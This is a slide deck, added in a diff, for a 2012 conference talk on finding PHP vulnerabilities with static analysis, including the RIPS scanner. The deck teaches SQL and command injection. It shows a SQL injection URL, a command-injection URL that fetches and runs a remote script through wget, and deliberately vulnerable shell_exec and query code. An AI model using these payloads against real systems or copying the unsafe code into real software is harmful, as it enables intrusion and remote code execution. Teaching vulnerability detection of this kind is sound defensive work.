@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<!--
+  Google HTML5 slide template
+
+  Authors: Luke Mahé (code)
+           Marcin Wichary (code and design)
+           
+           Dominic Mazzoni (browser compatibility)
+           Charles Chen (ChromeVox support)
+
+  URL: http://code.google.com/p/html5slides/
+-->
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>LCA 2012: PHP Static Code Analysis</title>
+
+    <meta charset="utf-8">
+    <script src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/slides.txt"></script>
+  <style>
+    /* Your individual styles here, or just use inline styles if that’s
+       what you want. */
+    
+    
+  </style><meta content="width=1100,height=750" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"></head>
+  
+  
+
+  <body class="loaded" style="display: none">
+
+    <section class="slides layout-regular template-lca">
+      
+      <!-- Your slides (<article>s) go here. Delete or comment out the
+           slides below. -->
+        
+        
+      
+      <article class="biglogo current">
+	<h1>
+		Finding vulnerabilities in PHP code
+	</h1>
+	<h3>
+		(via static code analysis) 
+	</h3>
+	<p>By Peter Serwylo</p>
+	<p>http://peter.serwylo.com</p>
+	<p>@serwylo</p>
+      </article>
+
+	<article class="next">
+		<h1>
+			Vulnerabilities crash course
+		</h1>
+	</article>
+
+	<article class="far-next">
+		<h1>
+			Unsanitized user input
+		</h1>
+	</article>
+
+	<article class="">
+		<h1>
+			Quick quiz:
+		</h1>
+		<p>
+			What happens next?
+		</p>
+		<pre class="prettyprint"><span class="pln">$id </span><span class="pun">=</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">'id'</span><span class="pun">];</span><span class="pln"> 
+$username </span><span class="pun">=</span><span class="pln"> </span><span class="str">"user"</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> $id</span><span class="pun">;</span><span class="pln">
+mysqli_query</span><span class="pun">(</span><span class="pln"> </span><span class="str">"
+	SELECT * 
+	FROM Users 
+	WHERE Username = '"</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> $username </span><span class="pun">.</span><span class="pln"> </span><span class="str">"' AND Valid = 1"</span><span class="pln"> </span><span class="pun">);</span><span class="pln">
+		</span></pre>
+	</article>
+
+	<article class="fill">
+		<p class="build">
+			<img class="to-build" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/balrog.jpg">
+		</p>
+		<div class="source white">
+			Source: http://lotr.wikia.com
+		</div>
+	</article>
+
+	<article>
+		<h3>
+			Problem:
+		</h3>
+		<p class="build">
+				</p><p class="to-build">
+					http://example.com/?id=1' OR 1 #
+				</p>
+				<pre class="to-build prettyprint"><span class="pln">$id </span><span class="pun">=</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">'id'</span><span class="pun">];</span><span class="pln"> 
+$username </span><span class="pun">=</span><span class="pln"> </span><span class="str">"user"</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> $id</span><span class="pun">;</span><span class="pln">
+mysqli_query</span><span class="pun">(</span><span class="pln"> </span><span class="str">"
+	SELECT * 
+	FROM Users 
+	WHERE Username = '"</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> $username </span><span class="pun">.</span><span class="pln"> </span><span class="str">"' AND Valid = 1"</span><span class="pln"> </span><span class="pun">);</span><span class="pln">
+				</span></pre>
+				<pre class="prettyprint lang-sql to-build"><span class="pln">SELECT </span><span class="pun">*</span><span class="pln"> 
+FROM </span><span class="typ">Users</span><span class="pln"> 
+WHERE </span><span class="typ">Username</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="str">'user1'</span><span class="pln"> OR </span><span class="lit">1</span><span class="pln"> </span><span class="com"># AND Valid = 1"</span><span class="pln">
+				</span></pre>
+		<p></p>
+	</article>
+
+	<article>
+		<p style="padding-top: 50px">
+			<img class="centered" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/xkcd-sql.png">
+		</p>
+		<div class="source">
+			Source: http://xkcd.com/327 <br>
+			title="Her daughter is named Help I'm trapped in a driver's license factory."
+		</div>
+	</article>
+
+	<article>
+		<h1>
+			Okay, but that was fairly obvious!
+		</h1>
+	</article>
+
+      <article>
+        <h1>
+          But what about...
+        </h1>
+        <pre class="prettyprint"><span class="kwd">foreach</span><span class="pln"> </span><span class="pun">(</span><span class="pln"> $_REQUEST </span><span class="kwd">as</span><span class="pln"> $key </span><span class="pun">=&gt;</span><span class="pln"> $value </span><span class="pun">)</span><span class="pln">
+</span><span class="pun">{</span><span class="pln">
+	$$key </span><span class="pun">=</span><span class="pln"> $value</span><span class="pun">;</span><span class="pln">
+</span><span class="pun">}</span><span class="pln">
+</span><span class="pun">...</span><span class="pln">
+</span><span class="com">// 25 lines of miscellanious, unrelated code</span><span class="pln">
+</span><span class="pun">...</span><span class="pln">
+mysqli_query</span><span class="pun">(</span><span class="pln">
+	</span><span class="str">"SELECT * FROM Users WHERE Username = '"</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> $username </span><span class="pun">.</span><span class="pln"> </span><span class="str">"'"</span><span class="pln"> </span><span class="pun">);</span><span class="pln">
+	</span></pre>
+      </article>
+
+      <article class="fill smaller">
+        <p class="build">
+          <img class="to-build" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/balrog.jpg">
+        </p>
+        <div class="source white">
+          Source: http://lotr.wikia.com
+        </div>
+      </article>
+      
+	<article>
+        <h1>
+        	"Just don't do it"
+		</h1>
+	</article>
+
+	<article>
+		<h1>
+			My problem:
+		</h1>
+		<pre class="prettyprint"><span class="pln">$taintedCmd </span><span class="pun">=</span><span class="pln"> </span><span class="str">"wc -w "</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">'file'</span><span class="pun">];</span><span class="pln">
+shell_exec</span><span class="pun">(</span><span class="pln"> $taintedCmd </span><span class="pun">);</span><span class="pln">
+		</span></pre>
+      </article>
+
+      <article class="fill">
+        <p class="build">
+          <img class="to-build" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/balrog.jpg">
+        </p>
+        <div class="source white">
+          Source: http://lotr.wikia.com
+        </div>
+      </article>
+
+	<article>
+		<h3>
+			Problem:
+		</h3>
+		<p>
+http://example.com/?file=<br>
+&nbsp;&nbsp;file.txt' &amp;&amp;<br>
+&nbsp;&nbsp;wget http://dogeysite.com/hack.zip &amp;&amp;<br>
+&nbsp;&nbsp;unzip hack.zip &amp;&amp;<br>
+&nbsp;&nbsp;./hack.sh #
+		</p>
+	</article>
+
+	<article class="fill">
+		<p class="build">
+			<img class="to-build" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/steelin-ur-datax.jpg">
+		</p>
+	</article>
+
+      <article>
+        <h3>
+          First thought:
+        </h3>
+        <pre class="prettyprint lang-bash"><span class="pln">grep </span><span class="pun">-</span><span class="pln">r </span><span class="pun">-</span><span class="pln">B </span><span class="lit">10</span><span class="pln"> </span><span class="pun">-</span><span class="pln">i </span><span class="str">"shell_exec"</span><span class="pln"> </span><span class="pun">&gt;&gt;</span><span class="pln"> commandExecutions</span><span class="pun">.</span><span class="pln">txt 
+        </span></pre>
+        <pre class="prettyprint"><span class="pun">...</span><span class="pln">
+file</span><span class="pun">.</span><span class="pln">php</span><span class="pun">-</span><span class="pln">     $cmd </span><span class="pun">=</span><span class="pln"> </span><span class="str">"find -name '"</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> $name </span><span class="pun">.</span><span class="pln"> </span><span class="str">"' documents/"</span><span class="pun">;</span><span class="pln">
+file</span><span class="pun">.</span><span class="pln">php</span><span class="pun">-</span><span class="pln">   </span><span class="pun">}</span><span class="pln">
+file</span><span class="pun">.</span><span class="pln">php</span><span class="pun">-</span><span class="pln"> </span><span class="pun">}</span><span class="pln">   
+file</span><span class="pun">.</span><span class="pln">php</span><span class="pun">:</span><span class="pln"> echo shell_exec</span><span class="pun">(</span><span class="pln"> $cmd </span><span class="pun">);</span><span class="pln">
+        </span></pre>
+      </article>
+
+      <article class="fill smaller">
+        <p class="build">
+          <img class="to-build" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/rubbish-bin.png">
+        </p>
+        <div class="source white">
+          http://www.sciencephoto.com
+        </div>
+      </article>
+
+      <article class="smaller">
+        <h3>
+          But...
+        </h3>
+        <iframe src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/a.html"></iframe>
+      </article>
+
+      <article class="fill smaller">
+        <p class="build">
+          <img class="to-build" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/rubbish-tip.jpg">
+        </p>
+        <div class="source white">
+          http://looneytunes09.files.wordpress.com/2010/08/landfill.jpg
+        </div>
+      </article>
+
+      <article>
+        <h1>
+          How do you detect vulnerabilities in code?
+        </h1>
+	<p class="build">
+		</p><p class="to-build">
+			http://www.google.com.au/search?q=
+			<br>
+			&nbsp;&nbsp;how+do+you+detect+vulnerabilities+in+code
+		</p>
+	<p></p>
+      </article>
+
+	<article>
+		<img class="centered" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/fwse.png">
+	</article>
+
+	<article>
+		<h1>Static Code Analysis (SCA)</h1>
+		<p>Source Code Analysis</p>
+		<p>Static Program Analysis</p>
+		<p>Compile Time Analysis (well, not for PHP)</p>
+	</article>
+
+	<article>
+		<h1>Analysis without execution</h1>
+		<p>Optimising compilers (e.g. g++)</p>
+		<p>IDE's with type checking/code completion</p>
+	</article>
+
+	<article>
+		<h1>Step 1: Lexical analysis</h1>
+		<p>Split code into tokens</p>
+		<div class="source">Source: http://sourceforge.net/projects/rips-scanner/files/rips-paper.pdf/download</div>
+	</article>
+
+	<article>
+		<h1>Step 2: Semantic analysis</h1>
+		<pre class="prettyprint"><span class="kwd">print</span><span class="pln"> </span><span class="str">"print"</span><span class="pun">;</span></pre>
+		<p>First print is a command</p>
+		<p>Second print is a string</p>
+		<div class="source">Source: http://sourceforge.net/projects/rips-scanner/files/rips-paper.pdf/download</div>
+	</article>
+
+	<article>
+		<h1>Step 3: Control flow analysis</h1>
+		<pre class="prettyprint"><span class="kwd">function</span><span class="pln"> firstCall</span><span class="pun">(</span><span class="pln"> $input </span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
+	</span><span class="kwd">return</span><span class="pln"> secondCall</span><span class="pun">(</span><span class="pln"> $input </span><span class="pun">)</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> </span><span class="str">" - 1st"</span><span class="pun">;</span><span class="pln">
+</span><span class="pun">}</span><span class="pln">
+
+</span><span class="kwd">function</span><span class="pln"> secondCall</span><span class="pun">(</span><span class="pln"> $input </span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
+	</span><span class="kwd">return</span><span class="pln"> $input </span><span class="pun">.</span><span class="pln"> </span><span class="str">" - 2nd"</span><span class="pun">;</span><span class="pln">
+</span><span class="pun">}</span><span class="pln">
+
+firstCall</span><span class="pun">(</span><span class="pln"> </span><span class="str">"input"</span><span class="pln"> </span><span class="pun">);</span></pre>
+		<div class="source">Source: http://sourceforge.net/projects/rips-scanner/files/rips-paper.pdf/download</div>
+	</article>
+
+	<article>
+		<h1>Step 4: Data flow analysis</h1>
+		<pre class="prettyprint"><span class="kwd">function</span><span class="pln"> firstCall</span><span class="pun">(</span><span class="pln"> $input </span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
+	</span><span class="kwd">return</span><span class="pln"> secondCall</span><span class="pun">(</span><span class="pln"> escapeshellarg</span><span class="pun">(</span><span class="pln"> $input </span><span class="pun">)</span><span class="pln"> </span><span class="pun">);</span><span class="pln">
+</span><span class="pun">}</span><span class="pln">
+
+</span><span class="kwd">function</span><span class="pln"> secondCall</span><span class="pun">(</span><span class="pln"> $input </span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
+	</span><span class="kwd">return</span><span class="pln"> shell_exec</span><span class="pun">(</span><span class="pln"> $input </span><span class="pun">);</span><span class="pln"> </span><span class="com">// Is $input safe?</span><span class="pln">
+</span><span class="pun">}</span><span class="pln">
+
+firstCall</span><span class="pun">(</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">'input'</span><span class="pun">]</span><span class="pln"> </span><span class="pun">);</span><span class="pln">  </span><span class="com">// Safe</span><span class="pln">
+secondCall</span><span class="pun">(</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">'input'</span><span class="pun">]</span><span class="pln"> </span><span class="pun">);</span><span class="pln"> </span><span class="com">// Not-safe</span></pre>
+		<div class="source">Source: http://sourceforge.net/projects/rips-scanner/files/rips-paper.pdf/download</div>
+	</article>
+
+	<article class="fill">
+		<img src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/coke-crushed.jpg">
+		<div class="source white">
+			http://www.flickr.com/photos/ruthyyy/5000648691
+		</div>
+	</article>
+
+	<article>
+		<img class="centered" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/can-patent.png">
+	</article>
+
+	<article>
+		<h1>RIPS - PHP Scanner</h1>
+		<p>http://www.phpscanner.net</p>
+	</article>
+
+	<article>
+		<h1>
+			Example time
+		</h1>
+	</article>
+
+	<article>
+		<h3>Example 1</h3>
+		<pre class="prettyprint lang-php"><span class="pln">shell_exec</span><span class="pun">(</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">'input'</span><span class="pun">]</span><span class="pln"> </span><span class="pun">);</span><span class="pln">
+		</span></pre>
+		<div class="source">
+			<a target="_blank" href="http://rips.gamma.peter.serwylo.com/">http://rips.gamma.peter.serwylo.com/</a>
+			<br>
+			/srv/http-rips/tests/vuln1.php
+		</div>
+	</article>
+
+	<article>
+		<h3>Example 2</h3>
+		<pre class="prettyprint lang-php"><span class="kwd">function</span><span class="pln"> vulnFunction</span><span class="pun">(</span><span class="pln"> $cmd </span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
+	$result </span><span class="pun">=</span><span class="pln"> shell_exec</span><span class="pun">(</span><span class="pln"> $cmd </span><span class="pun">);</span><span class="pln">
+</span><span class="pun">}</span><span class="pln">
+
+</span><span class="kwd">function</span><span class="pln"> intermittentFunction</span><span class="pun">(</span><span class="pln"> $input </span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln">
+	$param </span><span class="pun">=</span><span class="pln"> </span><span class="str">"test "</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> $input </span><span class="pun">.</span><span class="pln"> </span><span class="str">" bleh"</span><span class="pun">;</span><span class="pln">
+	vulnFunction</span><span class="pun">(</span><span class="pln"> $param </span><span class="pun">);</span><span class="pln">
+</span><span class="pun">}</span><span class="pln">
+
+$firstHand </span><span class="pun">=</span><span class="pln"> $_GET</span><span class="pun">[</span><span class="str">'input'</span><span class="pun">];</span><span class="pln">
+$secondHand </span><span class="pun">=</span><span class="pln"> </span><span class="str">"IMZ TAINTED: "</span><span class="pln"> </span><span class="pun">.</span><span class="pln"> $firstHand </span><span class="pun">.</span><span class="pln"> </span><span class="str">", YEAH!"</span><span class="pun">;</span><span class="pln">
+
+intermittentFunction</span><span class="pun">(</span><span class="pln"> $secondHand </span><span class="pun">);</span><span class="pln">
+		</span></pre>
+		<div class="source">
+			<a target="_blank" href="http://rips.gamma.peter.serwylo.com/">http://rips.gamma.peter.serwylo.com/</a>
+			<br>
+			/srv/http-rips/tests/vuln2.php
+		</div>
+	</article>
+
+	<article>
+		<h1>
+			Miscellanious PHP projects from freecode.com
+		</h1>
+		<p>(formally freshmeat.net)</p>
+	</article>
+
+	<article>
+		<img class="centered" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/sacrifice.jpg">
+	</article>
+
+	<article>
+		<h3>
+			Example 3
+		</h3>
+		<br>
+		<a target="_blank" href="http://peter.serwylo.com/archive/talks/lca/2012/rips-results/test-1.html">
+			<img class="centered" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/test-1-screenie.png" width="90%">
+		</a>
+	</article>
+
+	<article>
+		<h2>
+			False Positives
+		</h2>
+		<br>
+		<img class="centered" src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/custom-sanitizer.png" width="90%">
+	</article>
+	
+	<article class="fill">
+		<img src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/cans-pile.jpg">
+		<div class="source white">
+			http://www.cancrusher.co.za
+		</div>
+	</article>
+	
+	<article>
+		<h1>
+			Custom Securing Functions
+		</h1>
+	</article>
+
+	<article class="fill">
+		<p class="build">
+			<img src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/securing-gravel.jpg" class="to-build">
+		</p>
+		<div class="source white">
+			http://winningateverything.com
+		</div>
+	</article>
+
+      <article>
+	<h1>
+		Custom Securing Functions
+	</h1>
+	
+	<p>
+		config/securing.php
+	</p>
+
+	<pre class="prettyprint lang-php"><span class="com">// securing functions for file handling</span><span class="pln">
+$F_SECURING_FILE </span><span class="pun">=</span><span class="pln"> array</span><span class="pun">(</span><span class="pln">
+	</span><span class="str">'sanitize_filename'</span><span class="pln">
+</span><span class="pun">);</span><span class="pln">
+	</span></pre>
+      </article>
+
+	<article>
+		<h1>
+			Custom Securing Functions
+		</h1>
+		<p>
+			config/securing.php
+		</p>
+		<pre class="prettyprint lang-php"><span class="com">// securing functions for every vulnerability</span><span class="pln">
+$F_SECURING_STRING </span><span class="pun">=</span><span class="pln"> array</span><span class="pun">(</span><span class="pln">
+	</span><span class="str">'sanitize_int'</span><span class="pun">,</span><span class="pln">
+	</span><span class="str">'intval'</span><span class="pun">,</span><span class="pln">
+	</span><span class="str">'floatval'</span><span class="pun">,</span><span class="pln">
+	</span><span class="str">'md5'</span><span class="pun">,</span><span class="pln">
+	</span><span class="pun">...</span><span class="pln">
+		</span></pre>
+	</article>
+
+      <article>
+	<h3>
+		Limitations
+	</h3>
+	<ul class="build">
+		<li class="to-build">OOP not supported</li>
+		<li class="to-build">Can't successfully resolve all includes</li>
+		<li class="to-build">Browser based</li>
+		<li class="to-build">Slow to scan</li>
+	</ul>
+      </article>
+
+      <article>
+	<h1>
+		What I'd love to see
+	</h1>
+	<p>
+		Plugins for php compilers (e.g. HipHop/phc/rphp)
+	</p>
+	<ul>
+		<li>Written in C++ for improved performance</li>
+		<li>Already have established parsers</li>
+		<li>Already analyse code for optimisations</li>
+	</ul>
+      </article>
+
+	<article class="fill">
+		<h1>Thanks for listening</h1>
+		<p>Questions?</p>
+		<!--<p class="build">
+			<img class="to-build" src="kthnxbai.jpg" />
+		</p>
+		<div class="source white">
+			http://cheezburger.com
+		</div>-->
+	</article>
+
+    <div id="prev-slide-area" class="slide-area"></div><div id="next-slide-area" class="slide-area"></div></section>
+
+  
+
+
+<link href="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/css.css" type="text/css" rel="stylesheet"><link href="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/styles.css" type="text/css" rel="stylesheet"><script src="LCA%202012_%20PHP%20Static%20Code%20Analysis_files/prettify.txt" type="text/javascript"></script></body></html>
